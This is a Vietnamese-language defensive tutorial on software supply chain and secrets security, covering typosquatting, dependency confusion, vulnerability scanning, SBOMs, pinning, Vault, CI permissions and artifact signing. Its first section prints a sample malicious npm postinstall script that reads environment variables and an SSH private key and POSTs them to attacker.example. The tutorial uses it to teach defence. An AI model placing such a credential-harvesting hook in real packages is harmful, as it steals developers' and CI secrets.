# Supply Chain & Secrets Security

Bạn không còn chỉ viết code của riêng mình nữa. Một service Node.js trung bình kéo về hơn 1000 transitive dependencies; một container image production chứa hàng trăm OS package bạn chưa bao giờ đọc. Mỗi dòng `npm install`, mỗi `FROM`, mỗi secret hardcode là một cánh cửa attacker có thể đi vào mà không cần đụng tới firewall của bạn. Đây là **supply chain attack**: thay vì tấn công bạn trực tiếp, kẻ địch tấn công thứ bạn _tin tưởng_.

Bài này tiếp cận theo tư duy phòng thủ của kỹ sư xây hệ thống: hiểu attack cụ thể, rồi dựng hàng rào tự động trong pipeline để con người không phải nhớ.

> 💡 **Nguyên tắc**: Trust is a vulnerability. Mọi dependency, base image, và CI token đều là attack surface. Mục tiêu không phải "tin ít hơn" mà là "verify được mọi thứ bạn tin".

---

## 1. Dependency risk: kẻ địch ở trong `node_modules`

### Typosquatting

Attacker publish một package có tên gần giống package phổ biến, đợi developer gõ nhầm.

| Package thật | Typosquat |
|---|---|
| `lodash` | `lodahs`, `lodash-js` |
| `python-dateutil` | `python-dateutils` |
| `requests` | `request` (đã từng có malware) |
| `@types/node` | `types-node` |

Khi cài, lifecycle script chạy ngay với quyền của developer:

```json
// package.json của package độc hại
{
  "name": "lodahs",
  "scripts": {
    "postinstall": "node ./harvest.js"  // chạy lúc npm install
  }
}
```

```js
// harvest.js — chạy với mọi quyền của user đang npm install
const fs = require('fs');
const https = require('https');
const env = JSON.stringify(process.env);          // lấy AWS_SECRET_ACCESS_KEY, NPM_TOKEN...
const ssh = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`, 'utf8');
https.request('https://attacker.example/x', { method: 'POST' }).end(env + ssh);
```

> ⚠️ **Lỗ hổng**: `postinstall`/`preinstall` script chạy code tùy ý **trước khi** bạn kịp review một dòng nào. Trên dev laptop nó đọc được SSH key, AWS creds, `.npmrc` token. Trong CI nó đọc được toàn bộ secret của runner.

**Phòng — tắt script tùy tiện, dùng allowlist:**

```bash
# Cài mà KHÔNG chạy lifecycle script (npm >= 9 / pnpm)
npm install --ignore-scripts
pnpm install --ignore-scripts

# pnpm: chỉ cho phép build script của package được khai báo tường minh
# .npmrc
enable-pre-post-scripts=false
```

```jsonc
// pnpm: onlyBuiltDependencies — allowlist các package được phép chạy build
// package.json
{
  "pnpm": {
    "onlyBuiltDependencies": ["esbuild", "sharp"]
  }
}
```

### Malicious / hijacked package

Khác typosquat: đây là package _đúng_ tên nhưng bị chiếm. Các vector thật:
- **Maintainer account bị takeover** (npm token leak, không bật 2FA) → push version mới có malware (vụ `ua-parser-js`, `coa`, `rc` năm 2021).
- **Dependency confusion**: bạn có private package `@acme/utils`; attacker publish `@acme/utils` lên public registry với version cao hơn. Resolver mặc định ưu tiên public → kéo về bản độc.
- **Protestware / sabotage** (`node-ipc`, `colors`, `faker` tự phá năm 2022).

**Phòng dependency confusion — khóa scope về registry nội bộ:**

```ini
# .npmrc — mọi package @acme PHẢI lấy từ registry nội bộ, không bao giờ đi public
@acme:registry=https://npm.internal.acme.com/
//npm.internal.acme.com/:_authToken=${NPM_INTERNAL_TOKEN}
```

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 320" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
  <title>Dependency confusion — resolver bị lừa kéo bản public version cao hơn</title>
  <desc>Cùng tên @acme/utils tồn tại ở registry nội bộ (1.2.0) và public registry do attacker publish (9.9.9). Resolver mặc định so version chọn 9.9.9 độc hại. Khóa scope về registry nội bộ chặn việc đi ra public.</desc>
  <text x="16" y="24" font-size="15" font-weight="700" fill="currentColor">Dependency confusion</text>
  <g>
    <rect x="280" y="40" width="160" height="56" rx="10" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.2"/>
    <text x="360" y="64" font-size="12" font-weight="700" text-anchor="middle" fill="currentColor">resolver (npm install)</text>
    <text x="360" y="82" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.62">cần @acme/utils</text>
  </g>
  <g>
    <rect x="16" y="170" width="300" height="92" rx="10" fill="#10b981" fill-opacity="0.14" stroke="currentColor" stroke-opacity="0.2"/>
    <text x="32" y="194" font-size="12" font-weight="700" fill="currentColor">Registry nội bộ</text>
    <text x="32" y="214" font-size="10.5" fill="currentColor" opacity="0.7">npm.internal.acme.com</text>
    <text x="32" y="236" font-size="11.5" font-weight="700" fill="currentColor">@acme/utils 1.2.0</text>
    <text x="32" y="253" font-size="10.5" fill="currentColor" opacity="0.62">bản thật, private</text>
  </g>
  <g>
    <rect x="404" y="170" width="300" height="92" rx="10" fill="#f59e0b" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.2"/>
    <text x="420" y="194" font-size="12" font-weight="700" fill="currentColor">Public registry</text>
    <text x="420" y="214" font-size="10.5" fill="currentColor" opacity="0.7">registry.npmjs.org</text>
    <text x="420" y="236" font-size="11.5" font-weight="700" fill="currentColor">@acme/utils 9.9.9</text>
    <text x="420" y="253" font-size="10.5" fill="currentColor" opacity="0.62">attacker publish, version cao hơn</text>
  </g>
  <g stroke="currentColor" stroke-opacity="0.4" fill="none" stroke-width="1.5" stroke-dasharray="5 4">
    <path d="M320 96 L200 164" marker-end="url(#dch)"/>
  </g>
  <g stroke="#f59e0b" fill="none" stroke-width="2.2">
    <path d="M400 96 L516 161" marker-end="url(#dchr)"/>
  </g>
  <text x="232" y="138" font-size="10.5" fill="currentColor" opacity="0.7" transform="rotate(-29 232 138)">1.2.0</text>
  <text x="442" y="108" font-size="11" font-weight="700" fill="#f59e0b" transform="rotate(29 442 108)">chọn 9.9.9 (cao hơn)</text>
  <rect x="404" y="276" width="300" height="34" rx="8" fill="#f59e0b" fill-opacity="0.16" stroke="currentColor" stroke-opacity="0.18"/>
  <text x="554" y="297" font-size="11" font-weight="700" text-anchor="middle" fill="currentColor">kéo về bản độc hại</text>
  <rect x="16" y="276" width="300" height="34" rx="8" fill="#10b981" fill-opacity="0.16" stroke="currentColor" stroke-opacity="0.18"/>
  <text x="166" y="297" font-size="10.5" font-weight="700" text-anchor="middle" fill="currentColor">Chặn: khóa scope @acme về nội bộ</text>
  <defs>
    <marker id="dch" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0 0 L9 4.5 L0 9 z" fill="currentColor" fill-opacity="0.5"/></marker>
    <marker id="dchr" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0 0 L9 4.5 L0 9 z" fill="#f59e0b"/></marker>
  </defs>
</svg>

---

## 2. SCA scanning — biết bạn đang dùng gì có lỗ hổng

**SCA (Software Composition Analysis)** quét toàn bộ dependency tree, đối chiếu với database CVE/advisory, báo package nào có lỗ hổng đã biết. Đây là cách bạn phát hiện "chúng ta đang dùng `log4j 2.14` dính Log4Shell" mà không cần đọc 1200 package bằng tay.

```bash
# Built-in
npm audit --audit-level=high
pip-audit                         # Python
govulncheck ./...                 # Go (chỉ báo CVE thực sự reachable trong code)

# Cross-ecosystem, dùng nhiều trong CI
trivy fs --scanners vuln,secret .
osv-scanner --lockfile=package-lock.json
grype dir:.
```

**Gắn vào CI và fail build khi có lỗ hổng nghiêm trọng:**

```yaml
# .github/workflows/security.yml
name: sca
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read          # least privilege, xem mục 5
    steps:
      - uses: actions/checkout@v4
      - name: OSV scan
        uses: google/osv-scanner-action@v1
        with:
          scan-args: |-
            --lockfile=./package-lock.json
            --fail-on-vuln
```

> 💡 **Nguyên tắc**: SCA chỉ thấy lỗ hổng **đã biết**. Nó không phát hiện malware ngày 0 hay typosquat tên mới. Hãy coi nó là một lớp, không phải toàn bộ phòng thủ. Kết hợp với SBOM + pin + allowlist registry.

Quản trị tiếng ồn: dùng file ignore có **thời hạn và lý do**, đừng tắt vĩnh viễn.

```toml
# .trivyignore.yaml hoặc osv-scanner.toml
[[IgnoredVulns]]
id = "CVE-2024-12345"
ignoreUntil = 2026-07-01          # buộc review lại
reason = "không reachable: chỉ dùng trong code path test"
```

---

## 3. SBOM — danh sách nguyên liệu

**SBOM (Software Bill of Materials)** là bản kê khai máy-đọc-được mọi thành phần trong artifact của bạn: package, version, license, hash. Hai format chuẩn: **CycloneDX** và **SPDX**.

Tại sao kỹ sư build cần nó: khi một CVE mới nổ (kiểu Log4Shell lúc 2 giờ sáng), câu hỏi đầu tiên là _"chúng ta có dùng nó ở đâu không, image nào, version nào?"_. Có SBOM lưu sẵn cho mỗi release thì trả lời trong vài giây bằng một câu query; không có thì grep mò cả tổ chức trong nhiều ngày.

```bash
# Sinh SBOM (CycloneDX) cho source và cho container image
syft dir:. -o cyclonedx-json=sbom.json
syft myapp:1.4.2 -o spdx-json=sbom.spdx.json

# Sau này, quét lỗ hổng TRÊN sbom đã lưu — không cần build lại
grype sbom:./sbom.json
```

> 💡 **Nguyên tắc**: Sinh SBOM tại thời điểm build, **đính kèm vào release/artifact**, và lưu trữ. SBOM sinh ra rồi vứt đi thì vô dụng — giá trị nằm ở chỗ truy được ngược lại artifact đã ship.

---

## 4. Pin & lockfile — build phải tái lập được

Nếu hôm nay build ra một thứ, ngày mai build ra thứ khác, thì SCA và SBOM của bạn nói dối. **Reproducibility là nền của mọi thứ phía trên.**

| Cấp độ | Yếu (đừng dùng cho production) | Mạnh |
|---|---|---|
| npm range | `"express": "^4.18.0"` | lockfile + `npm ci` |
| Docker base | `FROM node:20` | `FROM node:20.11.1-slim@sha256:abc...` |
| GitHub Action | `uses: actions/checkout@v4` | `uses: actions/checkout@8f4b...` (pin SHA) |
| pip | `requests` | `requests==2.31.0 --hash=sha256:...` |

```dockerfile
# ⚠️ Lỗ hổng: tag "mềm" — :20 có thể trỏ image khác sau mỗi push
FROM node:20

# Phòng: pin theo digest immutable — luôn ra đúng một image
FROM node:20.11.1-slim@sha256:5d2f...e91a
```

```bash
# Dùng lockfile đúng cách trong CI: cài chính xác cây đã commit, fail nếu lệch
npm ci          # KHÔNG dùng "npm install" trong CI
pnpm install --frozen-lockfile
poetry install --no-update
```

> ⚠️ **Lỗ hổng**: `actions/checkout@v4` là một **tag di động**. Nếu account của maintainer action bị chiếm, tag `v4` có thể bị trỏ lại sang commit độc — và bạn chạy nó với quyền CI. Pin theo **commit SHA** đầy đủ là cách duy nhất bất biến.

---

## 5. Secrets management — đừng để bí mật trở thành lịch sử git

### Đừng bao giờ commit secret

```js
// ⚠️ Lỗ hổng: secret nằm trong source → vào git history vĩnh viễn,
// vào mọi clone, mọi fork, mọi backup. Đổi key thôi KHÔNG đủ.
const db = connect("postgres://admin:S3cr3t@prod-db:5432/app");
const stripe = new Stripe("sk_live_51H8x...");
```

```js
// Phòng: đọc từ environment / secret manager lúc runtime
const db = connect(process.env.DATABASE_URL);
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY);
```

Chặn tại nguồn bằng pre-commit hook và CI scanner:

```yaml
# .pre-commit-config.yaml — chặn TRƯỚC khi commit kịp tạo ra
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
```

```bash
# Quét cả lịch sử (khi audit repo cũ)
gitleaks detect --source . --redact
trufflehog git file://. --only-verified   # chỉ báo secret đã verify còn sống
```

> ⚠️ **Lỗ hổng**: Nếu secret đã lỡ commit, nó nằm trong git history **mãi mãi**. Việc duy nhất đúng là **rotate (vô hiệu hóa) ngay** secret đó, rồi mới dọn history. Xóa file ở commit sau không cứu được gì.

### Vault / Secrets Manager + rotation

Lưu secret tập trung trong **HashiCorp Vault** / **AWS Secrets Manager** / **GCP Secret Manager**, app lấy lúc runtime qua identity (không phải bằng một secret-để-lấy-secret).

```python
# App lấy DB credential động — Vault tự tạo user tạm, hết hạn sau 1h
import hvac
client = hvac.Client(url="https://vault.internal:8200")
client.auth.kubernetes.login(role="payments-api", jwt=read_sa_token())
creds = client.secrets.database.generate_credentials(name="app-postgres")
db = connect(user=creds["username"], password=creds["password"])  # TTL ngắn
```

> 💡 **Nguyên tắc**: Secret tốt nhất là secret **ngắn hạn (short-lived)**. Static credential sống nhiều tháng là tài sản cho attacker; dynamic credential hết hạn sau 1 giờ thì leak cũng gần như vô giá trị. Ưu tiên rotation tự động, đặt TTL ngắn, và prefer **workload identity** (OIDC) hơn long-lived key.

**Rotation checklist:**
- [ ] Mọi secret có owner và lịch rotation (tự động nếu có thể).
- [ ] App đọc lại secret được mà không cần redeploy (hỗ trợ rotation không downtime).
- [ ] Có dual-secret window (key cũ + mới cùng valid) lúc xoay để tránh đứt.
- [ ] Audit log mọi lần access secret.

---

## 6. CI/CD security — pipeline là production

Runner CI của bạn có quyền vào registry, prod, secret store. Compromise CI = compromise mọi thứ nó deploy được. Vụ **SolarWinds** và **Codecov** là supply chain attack ngay trong build pipeline.

### Least-privilege runner

```yaml
# ⚠️ Lỗ hổng: token mặc định có write toàn repo; pull_request_target từ fork
#    chạy code của attacker VỚI secret của bạn
on: pull_request_target          # nguy hiểm khi checkout code PR
permissions: write-all           # quá rộng

# Phòng: tối thiểu hóa quyền, đọc là mặc định
permissions:
  contents: read
jobs:
  deploy:
    permissions:
      id-token: write            # chỉ job này, chỉ để lấy OIDC token
      contents: read
```

Checklist runner:
- [ ] `permissions` khai báo tường minh, mặc định `read`. Cấp `write`/`id-token` ở mức job, không ở mức workflow.
- [ ] **Không** dùng `pull_request_target` để checkout + chạy code từ fork chưa tin cậy.
- [ ] Third-party action **pin theo commit SHA**, không theo tag.
- [ ] Secret scope theo environment; production secret cần manual approval / protected environment.
- [ ] Dùng **OIDC federation** thay cho long-lived cloud key lưu trong CI.

### Signed artifact + SLSA

Sau khi build, **ký artifact** để consumer verify nó đến từ pipeline của bạn, không bị tráo. **Sigstore/cosign** cho phép ký keyless bằng OIDC identity.

```bash
# Ký container image keyless (danh tính = OIDC của CI, không cần quản lý private key)
cosign sign --yes registry.acme.com/payments:1.4.2

# Sinh + đính kèm SBOM và provenance attestation
cosign attest --yes --predicate sbom.json --type cyclonedx \
  registry.acme.com/payments:1.4.2

# Phía deploy: verify chữ ký + xuất xứ trước khi cho chạy
cosign verify \
  --certificate-identity-regexp 'https://github.com/acme/.*' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  registry.acme.com/payments:1.4.2
```

**SLSA** (Supply-chain Levels for Software Artifacts) là framework chia mức độ đảm bảo, ý tưởng cốt lõi: artifact phải đi kèm **provenance** chứng minh _build ở đâu, từ source nào, bằng tham số gì_, và provenance đó phải **không giả mạo được** (do CI sinh, không do người).

| SLSA (đại ý) | Yêu cầu cốt lõi |
|---|---|
| L1 | Build có script hóa + có provenance (dù chưa chống giả mạo). |
| L2 | Build trên service được host + provenance được ký. |
| L3 | Build isolated, non-falsifiable provenance, source/build có bảo vệ. |

> 💡 **Nguyên tắc**: Mục tiêu của signing + provenance là một chuỗi verify được: _"image này đến từ commit X, build bởi pipeline Y, gồm các thành phần trong SBOM Z"_. Không có chuỗi đó, "artifact tin cậy" chỉ là niềm tin.

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 360" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
  <title>Chuỗi ký &amp; provenance với cosign / SLSA</title>
  <desc>Commit X được CI pipeline Y build thành artifact và SBOM Z; CI ký keyless bằng OIDC identity; phía deploy verify chữ ký và provenance trước khi cho chạy — toàn bộ tạo thành một chuỗi verify được.</desc>
  <text x="16" y="24" font-size="15" font-weight="700" fill="currentColor">Chuỗi ký + provenance (cosign / SLSA)</text>
  <g>
    <rect x="16" y="44" width="150" height="60" rx="10" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.2"/>
    <text x="91" y="68" font-size="12.5" font-weight="700" text-anchor="middle" fill="currentColor">Commit X</text>
    <text x="91" y="86" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.62">source · git SHA</text>
  </g>
  <g>
    <rect x="226" y="44" width="160" height="60" rx="10" fill="#f59e0b" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.2"/>
    <text x="306" y="68" font-size="12.5" font-weight="700" text-anchor="middle" fill="currentColor">CI pipeline Y</text>
    <text x="306" y="86" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.62">build trên service host</text>
  </g>
  <g>
    <rect x="446" y="34" width="160" height="80" rx="10" fill="#10b981" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.2"/>
    <text x="526" y="58" font-size="12.5" font-weight="700" text-anchor="middle" fill="currentColor">Artifact + SBOM Z</text>
    <text x="526" y="76" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.62">image 1.4.2</text>
    <text x="526" y="92" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.62">+ provenance</text>
  </g>
  <g stroke="currentColor" stroke-opacity="0.55" fill="none" stroke-width="1.5">
    <path d="M166 74 H222" marker-end="url(#scah)"/>
    <path d="M386 74 H442" marker-end="url(#scah)"/>
  </g>
  <text x="194" y="68" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.7">build</text>
  <text x="414" y="68" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.7">sinh</text>
  <g>
    <rect x="226" y="146" width="160" height="56" rx="10" fill="#8b5cf6" fill-opacity="0.14" stroke="currentColor" stroke-opacity="0.2"/>
    <text x="306" y="170" font-size="12" font-weight="700" text-anchor="middle" fill="currentColor">cosign sign keyless</text>
    <text x="306" y="187" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.62">danh tính = OIDC của CI</text>
  </g>
  <g stroke="currentColor" stroke-opacity="0.55" fill="none" stroke-width="1.5">
    <path d="M306 104 V142" marker-end="url(#scah)"/>
    <path d="M386 174 H446 V120" marker-end="url(#scah)"/>
  </g>
  <text x="466" y="150" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.7">đính chữ ký</text>
  <g>
    <rect x="16" y="244" width="688" height="96" rx="10" fill="#10b981" fill-opacity="0.12" stroke="currentColor" stroke-opacity="0.2"/>
    <text x="32" y="270" font-size="12.5" font-weight="700" fill="currentColor">Phía deploy — verify trước khi cho chạy</text>
    <text x="32" y="292" font-size="11" fill="currentColor" opacity="0.78">cosign verify: chữ ký hợp lệ? OIDC issuer + identity đúng pipeline?</text>
    <text x="32" y="310" font-size="11" fill="currentColor" opacity="0.78">provenance: build từ commit X, bởi Y, gồm SBOM Z?</text>
    <text x="32" y="328" font-size="11" font-weight="700" fill="currentColor">→ khớp hết: cho chạy. Lệch một điểm: chặn (admission policy).</text>
  </g>
  <g stroke="currentColor" stroke-opacity="0.55" fill="none" stroke-width="1.5">
    <path d="M526 114 V210 H360 V240" marker-end="url(#scah)"/>
  </g>
  <text x="538" y="232" font-size="10" fill="currentColor" opacity="0.7">artifact đã ký</text>
  <defs>
    <marker id="scah" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0 0 L9 4.5 L0 9 z" fill="currentColor" fill-opacity="0.6"/></marker>
  </defs>
</svg>

### Container image trust

```dockerfile
# ⚠️ Lỗ hổng: base image "béo" → hàng trăm CVE OS, chạy bằng root
FROM ubuntu:latest
COPY . /app
CMD ["node", "/app/server.js"]
```

```dockerfile
# Phòng: minimal/distroless base pin digest, non-root, multi-stage
FROM node:20.11.1-slim@sha256:5d2f... AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci --ignore-scripts
COPY . .
RUN npm run build

FROM gcr.io/distroless/nodejs20-debian12@sha256:9a1c...   # không shell, không apt
USER nonroot
COPY --from=build /app/dist /app
CMD ["/app/server.js"]
```

Checklist image:
- [ ] Base image minimal (distroless / `slim` / `alpine`), pin theo **digest**.
- [ ] Multi-stage: build tool và secret **không** lọt vào image cuối.
- [ ] Chạy `USER nonroot`, filesystem read-only nếu được.
- [ ] Scan image trong CI (`trivy image`), fail nếu có CRITICAL.
- [ ] Ký bằng cosign; cluster chỉ chạy image đã verify (admission policy).
- [ ] Chỉ pull từ registry nội bộ đã được kiểm soát, không pull tùy ý từ internet.

---

## Checklist tổng hợp

| Lớp | Hành động tối thiểu |
|---|---|
| Dependency | `--ignore-scripts` + build-script allowlist; khóa scope registry chống dependency confusion |
| SCA | Quét trong CI, fail khi HIGH/CRITICAL; ignore phải có lý do + hạn |
| SBOM | Sinh & lưu kèm mỗi release (CycloneDX/SPDX) |
| Pin | Lockfile + `npm ci`; base image & action pin theo digest/SHA |
| Secrets | Không commit; gitleaks pre-commit + CI; Vault/Secrets Manager; short-lived + rotation |
| CI/CD | `permissions: read` mặc định; OIDC thay static key; pin action; không `pull_request_target` checkout fork |
| Artifact | cosign sign + verify; provenance/SLSA; admission chỉ chạy image đã ký |

---

## Liên hệ sang AWS

Cách các nguyên tắc trên ánh xạ vào AWS:

- **Secrets** → **AWS Secrets Manager** (lưu + **automatic rotation** qua Lambda cho RDS/Redshift) và **SSM Parameter Store** (SecureString, rẻ hơn cho config). Mã hóa at-rest bằng **AWS KMS**; dùng **grant**/key policy để kiểm soát ai decrypt được.
- **Bỏ long-lived key trong CI** → **IAM Roles Anywhere** hoặc **OIDC federation** giữa GitHub Actions và **IAM** (`sts:AssumeRoleWithWebIdentity`): runner lấy short-lived STS credential theo identity, không lưu access key. Đây chính là "workload identity" của mục 5.
- **Container trust** → **Amazon ECR** với **image scanning** (Basic, hoặc enhanced bằng **Amazon Inspector** đối chiếu CVE liên tục), **tag immutability**, và **ECR repository policy** giới hạn ai push/pull. Ký bằng cosign, verify ở **EKS** qua admission controller.
- **SCA & vulnerability** → **Amazon Inspector** quét EC2, ECR image, và Lambda; phát hiện CVE trong dependency mà không cần agent thủ công.
- **Phát hiện secret leak / hành vi bất thường** → **Amazon GuardDuty** cảnh báo khi credential bị dùng từ vị trí lạ; **AWS Config** + **CloudTrail** để audit thay đổi và truy vết access.
- **Chặn khai thác ở rìa** → **AWS WAF** trước ALB/CloudFront/API Gateway để chặn pattern tấn công đã biết (bổ trợ, không thay thế việc vá supply chain).
- **Quản trị tập trung** → bật **Inspector + GuardDuty + Config** qua **AWS Organizations** để policy áp cho mọi account, không sót.

> 💡 **Nguyên tắc cuối**: Supply chain security là một **pipeline**, không phải một công cụ. Mỗi lớp (dependency → SCA → SBOM → pin → secrets → CI → artifact → image) lọc bớt một loại rủi ro; tự động hóa toàn bộ trong CI để chúng chạy mỗi lần build, vì con người sẽ quên còn pipeline thì không.

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 502" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
  <title>Pipeline phòng thủ supply chain — 8 lớp lọc rủi ro</title>
  <desc>Tám lớp xếp dọc ngang hàng nhau từ trên xuống: Dependency, SCA, SBOM, Pin/lockfile, Secrets, CI/CD, Artifact, Image. Mũi tên hướng xuống nối các lớp theo trình tự pipeline; cột bên phải ghi loại rủi ro mỗi lớp lọc được.</desc>
  <text x="16" y="24" font-size="15" font-weight="700" fill="currentColor">Pipeline phòng thủ supply chain</text>
  <text x="16" y="42" font-size="11" fill="currentColor" opacity="0.6">Mỗi lớp lọc bớt một loại rủi ro — chạy tự động mỗi lần build</text>
  <text x="490" y="42" font-size="11" font-weight="700" fill="currentColor" opacity="0.6">Rủi ro lọc được</text>
  <g>
    <rect x="16" y="54" width="436" height="44" rx="9" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.18"/>
    <rect x="26" y="64" width="24" height="24" rx="7" fill="#3b82f6" fill-opacity="0.9"/>
    <text x="38" y="81" font-size="12" font-weight="700" text-anchor="middle" fill="#fff">1</text>
    <text x="60" y="73" font-size="12.5" font-weight="700" fill="currentColor">Dependency — ignore-scripts + allowlist</text>
    <text x="60" y="90" font-size="10.5" fill="currentColor" opacity="0.62">khóa scope registry</text>
    <text x="490" y="80" font-size="10.5" fill="currentColor" opacity="0.8">postinstall độc · dep. confusion</text>
  </g>
  <path d="M243 98 V108" stroke="currentColor" stroke-opacity="0.5" stroke-width="1.5" fill="none" marker-end="url(#pdh)"/>
  <g>
    <rect x="16" y="110" width="436" height="44" rx="9" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.18"/>
    <rect x="26" y="120" width="24" height="24" rx="7" fill="#3b82f6" fill-opacity="0.9"/>
    <text x="38" y="137" font-size="12" font-weight="700" text-anchor="middle" fill="#fff">2</text>
    <text x="60" y="137" font-size="12.5" font-weight="700" fill="currentColor">SCA — quét CVE, fail build</text>
    <text x="490" y="137" font-size="10.5" fill="currentColor" opacity="0.8">lỗ hổng đã biết (Log4Shell…)</text>
  </g>
  <path d="M243 154 V164" stroke="currentColor" stroke-opacity="0.5" stroke-width="1.5" fill="none" marker-end="url(#pdh)"/>
  <g>
    <rect x="16" y="166" width="436" height="44" rx="9" fill="#10b981" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.18"/>
    <rect x="26" y="176" width="24" height="24" rx="7" fill="#10b981" fill-opacity="0.95"/>
    <text x="38" y="193" font-size="12" font-weight="700" text-anchor="middle" fill="#fff">3</text>
    <text x="60" y="193" font-size="12.5" font-weight="700" fill="currentColor">SBOM — kê khai &amp; lưu kèm release</text>
    <text x="490" y="193" font-size="10.5" fill="currentColor" opacity="0.8">"có dùng ở đâu?" trả lời được</text>
  </g>
  <path d="M243 210 V220" stroke="currentColor" stroke-opacity="0.5" stroke-width="1.5" fill="none" marker-end="url(#pdh)"/>
  <g>
    <rect x="16" y="222" width="436" height="44" rx="9" fill="#10b981" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.18"/>
    <rect x="26" y="232" width="24" height="24" rx="7" fill="#10b981" fill-opacity="0.95"/>
    <text x="38" y="249" font-size="12" font-weight="700" text-anchor="middle" fill="#fff">4</text>
    <text x="60" y="249" font-size="12.5" font-weight="700" fill="currentColor">Pin / lockfile — npm ci, digest</text>
    <text x="490" y="249" font-size="10.5" fill="currentColor" opacity="0.8">tag di động · build không tái lập</text>
  </g>
  <path d="M243 266 V276" stroke="currentColor" stroke-opacity="0.5" stroke-width="1.5" fill="none" marker-end="url(#pdh)"/>
  <g>
    <rect x="16" y="278" width="436" height="44" rx="9" fill="#f59e0b" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.18"/>
    <rect x="26" y="288" width="24" height="24" rx="7" fill="#f59e0b" fill-opacity="0.95"/>
    <text x="38" y="305" font-size="12" font-weight="700" text-anchor="middle" fill="#fff">5</text>
    <text x="60" y="305" font-size="12.5" font-weight="700" fill="currentColor">Secrets — gitleaks, Vault, short-lived</text>
    <text x="490" y="305" font-size="10.5" fill="currentColor" opacity="0.8">secret lọt git · key sống lâu</text>
  </g>
  <path d="M243 322 V332" stroke="currentColor" stroke-opacity="0.5" stroke-width="1.5" fill="none" marker-end="url(#pdh)"/>
  <g>
    <rect x="16" y="334" width="436" height="44" rx="9" fill="#f59e0b" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.18"/>
    <rect x="26" y="344" width="24" height="24" rx="7" fill="#f59e0b" fill-opacity="0.95"/>
    <text x="38" y="361" font-size="12" font-weight="700" text-anchor="middle" fill="#fff">6</text>
    <text x="60" y="361" font-size="12.5" font-weight="700" fill="currentColor">CI/CD — OIDC, least privilege</text>
    <text x="490" y="361" font-size="10.5" fill="currentColor" opacity="0.8">runner bị chiếm · token quá rộng</text>
  </g>
  <path d="M243 378 V388" stroke="currentColor" stroke-opacity="0.5" stroke-width="1.5" fill="none" marker-end="url(#pdh)"/>
  <g>
    <rect x="16" y="390" width="436" height="44" rx="9" fill="#8b5cf6" fill-opacity="0.14" stroke="currentColor" stroke-opacity="0.18"/>
    <rect x="26" y="400" width="24" height="24" rx="7" fill="#8b5cf6" fill-opacity="0.95"/>
    <text x="38" y="417" font-size="12" font-weight="700" text-anchor="middle" fill="#fff">7</text>
    <text x="60" y="417" font-size="12.5" font-weight="700" fill="currentColor">Artifact — cosign sign + verify</text>
    <text x="490" y="417" font-size="10.5" fill="currentColor" opacity="0.8">artifact bị tráo · không rõ xuất xứ</text>
  </g>
  <path d="M243 434 V444" stroke="currentColor" stroke-opacity="0.5" stroke-width="1.5" fill="none" marker-end="url(#pdh)"/>
  <g>
    <rect x="16" y="446" width="436" height="44" rx="9" fill="#8b5cf6" fill-opacity="0.14" stroke="currentColor" stroke-opacity="0.18"/>
    <rect x="26" y="456" width="24" height="24" rx="7" fill="#8b5cf6" fill-opacity="0.95"/>
    <text x="38" y="473" font-size="12" font-weight="700" text-anchor="middle" fill="#fff">8</text>
    <text x="60" y="473" font-size="12.5" font-weight="700" fill="currentColor">Image — distroless, verify trước khi chạy</text>
    <text x="490" y="473" font-size="10.5" fill="currentColor" opacity="0.8">CVE OS · chạy root · chưa ký</text>
  </g>
  <defs>
    <marker id="pdh" markerWidth="9" markerHeight="9" refX="4.5" refY="7" orient="auto"><path d="M0 0 L4.5 9 L9 0 z" fill="currentColor" fill-opacity="0.6"/></marker>
  </defs>
</svg>
